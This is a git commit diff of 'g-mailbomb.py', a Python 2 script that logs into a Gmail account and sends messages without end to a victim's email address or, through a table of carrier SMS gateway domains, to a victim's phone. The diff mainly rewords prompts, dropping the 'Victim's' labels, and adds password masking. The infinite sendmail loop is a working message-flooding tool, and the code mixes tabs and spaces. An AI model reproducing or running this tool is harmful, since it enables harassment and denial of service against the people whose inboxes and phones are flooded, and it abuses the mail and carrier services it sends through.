052d5d6b671e536dae321ceb564b6deae054de7f
bossy0 <36817786+bossy0@users.noreply.github.com>
2018-04-23 21:34:07 +0300

    Update g-mailbomb.py

--- g-mailbomb.py
+++ g-mailbomb.py
@@ -3,77 +3,75 @@ import smtplib
 import getpass
 import sys
 import time
+import smtplib as s
+import getpass
 
 os.system("clear")
 os.system("figlet G-MAILBOMB")
 
-username = raw_input("My Gmail Username : ")
-password = raw_input("My Gmail Password : ")
+username = raw_input("Gmail Username (user@gmail.com): ")
+password = getpass.getpass(prompt='Gmail Password: ')
 
 obj = s.SMTP("smtp.gmail.com:587")
 obj.starttls()
 obj.login(username, password)
-
 print"\n\r"
 
-print """ What Do You Want To Do ?
-
-1 . Text Bomb
-2 . Email Bomb
-
+print """ What kind of bomb would you like to send?
+1. SMS
+2. Email
 """
 option = input()
 print("\n\r")
 if option == 1:
     carrier_attack = 0
-    print """ What İs Their Carrier ?
-        1. Alltel
-        2. AT&T
-        3. Rogers
-        4. Sprint
-        5. T-Mobile
-        6. Telus
-        7. Verizon
-        8. Virgin Mobile
-        9. Orange
-        \n\r
+    print """ What is their carrier? Respond with the corresponding number
+	1. Alltel
+	2. AT&T
+	3. Rogers
+	4. Sprint
+	5. T-Mobile
+	6. Telus
+	7. Verizon
+	8. Virgin Mobile
+	9. Orange
 """
     carrier = input()
 
     if carrier == 1:
-        carrier_attack = "@alltelmessage.com"
+	carrier_attack = "@alltelmessage.com"
     if carrier == 2:
-        carrier_attack = "@txt.att.net"
+	carrier_attack = "@txt.att.net"
     if carrier == 3:
-        carrier_attack = "@pcs.rogers.com"
+	carrier_attack = "@pcs.rogers.com"
     if carrier == 4:
-        carrier_attack = "@messaging.sprintpcs.com"
+	carrier_attack = "@messaging.sprintpcs.com"
     if carrier == 5:
-        carrier_attack = "@tmomail.net"
+	carrier_attack = "@tmomail.net"
     if carrier == 6:
-        carrier_attack = "@msg.telus.com"
+	carrier_attack = "@msg.telus.com"
     if carrier == 7:
-        carrier_attack = "@vtext.com"
+	carrier_attack = "@vtext.com"
     if carrier == 8:
-        carrier_attack = "@vmobl.com"
+	carrier_attack = "@vmobl.com"
     if carrier == 9:
-        carrier_attack = "@sms.orange.pl"
+	carrier_attack = "@sms.orange.pl"
 
-    v_phone = raw_input("Victim's Phone Number : ") + str(carrier_attack)
-    message = raw_input("The Message You Want To Send : ")
+    v_phone = raw_input("Phone Number: ") + str(carrier_attack)
+    message = raw_input("Message: ")
     phone_message = ("From: %s\r\nTo: %s \r\n\r\n %s"
        % (username, "" .join(v_phone), "" .join(message)))
 
     while 1:
         obj.sendmail(username, v_phone, phone_message)
-        print "Bombing... To Stop The Program CTRL + Z"
+	print "Message sent! Sending another.. Press Ctrl + C to stop."
 
 if option == 2:
-    v_email = raw_input("Victim's Email : ")
-    message = raw_input("The Message You Want To Send : ")
+    v_email = raw_input("Email: ")
+    message = raw_input("Message: ")
     email_message = (" \r\n\r\n From: %s\r\n To: %s\r\n\r\n  %s"
        % (username, "" .join(v_email), "" .join(message)))
 
     while 1:
         obj.sendmail(username, v_email, email_message)
-        print "Bombing... To Stop The Program CTRL + Z"
+	print "Message sent! Sending another.. Press Ctrl + C to stop."
